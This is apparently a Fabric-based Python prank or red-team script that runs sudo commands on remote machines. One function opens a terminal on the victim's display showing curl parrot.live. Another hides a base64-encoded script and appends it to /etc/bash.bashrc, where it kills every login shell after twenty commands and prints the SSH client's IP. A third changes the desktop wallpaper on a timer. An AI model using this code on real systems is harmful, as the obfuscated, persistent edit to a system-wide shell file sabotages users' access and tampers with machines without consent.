def parrot_party(connect): #download_gnome AND USE THE ACTUAL USER
    connect.sudo("DISPLAY=:0 gnome-terminal -e \"/bin/bash -l -c \'curl parrot.live; cat -\'\"")


def countdown_shell(connect):
    connect.sudo("sh -c 'echo "
                 "\"ZXhwb3J0IENPVU5UPTIwCmV4cG9ydCBQUk9NUFRfQ09NTUFORD0iZXhwb3J0IENPVU5UPVwiXCQoZXhwciBcJENPVU5UIC0gMS"
                 "lcIjsgZWNobyBcJENPVU5UOyBpZiBbIFwkQ09VTlQgLWx0IDAgXTsgdGhlbiBlY2hvIFwiQnllIDspIFwkKGVjaG8gXCRTU0hfQ09"
                 "OTkVDVElPTiB8IGF3ayAne3ByaW50IFwkMX0nKVwiOyBzbGVlcCAxOyBraWxsIC05IFwkUFBJRDsgZmkiICAgICAgICAgICAgICAg"
                 "ICAgICAgICAgICAgICAgICAgICAgICAK\" | base64 -d | sudo tee -a /etc/bash.bashrc'")


def change_background_ubuntu(connect):
    # connect.put('UploadFiles/ozvsk.jpg')
    # connect.run("wget https://i.imgur.com/cYaz163.png")
    connect.run("sh -c 'echo \"gsettings set org.gnome.desktop.background picture-uri file:///home/sysadmin/cYaz163.png\" | at -m now + 1 minute'")

    # connect.run("sh -c 'export DISPLAY=:0 && gsettings set org.gnome.desktop.background picture-uri \"file:///home/sysadmin/ozvsk.jpg\" ' ")